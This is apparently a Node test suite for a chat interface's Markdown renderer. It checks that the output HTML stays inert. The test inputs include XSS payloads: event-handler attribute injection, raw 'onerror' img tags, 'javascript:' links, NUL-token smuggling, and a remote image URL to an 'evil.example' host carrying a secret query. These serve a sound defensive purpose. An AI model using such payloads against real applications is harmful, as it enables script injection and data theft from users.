// Le rendu Markdown du chat (web/static/lib/markdown.js) : sûr par
// construction, même face à du texte conçu pour le tromper.
import { test } from "node:test";
import assert from "node:assert/strict";
import { Markdown } from "../../llm_proxy/ui/web/static/lib/markdown.js";

const render = Markdown.render;

// Aucun attribut d'évènement, aucune balise hors de la liste connue.
function assertInert(html) {
  for (const [tag] of html.matchAll(/<[^>]*>/g)) assert.doesNotMatch(tag, /\son\w+\s*=/i, html);
  assert.doesNotMatch(html, /<(?!\/?(?:p|br|a|img|code|pre|div|span|button|strong|em|del|h[1-6]|ul|ol|li|blockquote|hr|table|thead|tbody|tr|th|td)\b)/i, html);
  assert.doesNotMatch(html, /\u0000/, html);
}

test("une image dans l'URL d'un lien ne ferme pas l'attribut", () => {
  const html = render("[a](https://x/![i](https://u/onmouseover=document.title='PWNED'//))");
  assertInert(html);
  // Chaque attribut ouvert est refermé avant le suivant : pas de `"` dans un href.
  for (const m of html.matchAll(/href="([^"]*)"/g)) assert.doesNotMatch(m[1], /[<>]/);
});

test("un NUL littéral ne sert pas de jeton", () => {
  const html = render("`x\"` puis \u00000\u0000 et [l](https://a/\u00000\u0000)");
  assertInert(html);
  assert.doesNotMatch(html, /href="https:\/\/a\/<code>/);
});

test("le code dans le texte d'un lien est rendu (jetons imbriqués)", () => {
  assert.equal(render("[`f()` doc](https://e.org/f)"),
    '<p><a href="https://e.org/f" target="_blank" rel="noopener noreferrer"><code>f()</code> doc</a></p>');
});

test("une image du proxy est chargée, une image distante attend un clic", () => {
  assert.match(render("![plot](/v1/files/abc.png)"), /<img src="\/v1\/files\/abc\.png" alt="plot"/);
  const remote = render("![chat](https://evil.example/?q=secret)");
  assert.doesNotMatch(remote, /<img/);
  assert.match(remote, /class="md-img-load" data-src="https:\/\/evil\.example\/\?q=secret"/);
  assert.match(remote, /\(evil\.example\)/);
});

test("le texte alternatif ne transporte pas de balise", () => {
  const html = render("![`a\"b` x](/v1/files/i.png)");
  assertInert(html);
  assert.match(html, /alt=" x"/);
});

test("HTML brut et javascript: restent du texte", () => {
  const html = render('<img src=x onerror=alert(1)> [j](javascript:alert(1))');
  assertInert(html);
  assert.match(html, /&lt;img/);
  assert.doesNotMatch(html, /href="javascript/);
});

test("une URL nue s'arrête avant un jeton", () => {
  assertInert(render("https://a.example/`\" onmouseover=x`"));
});
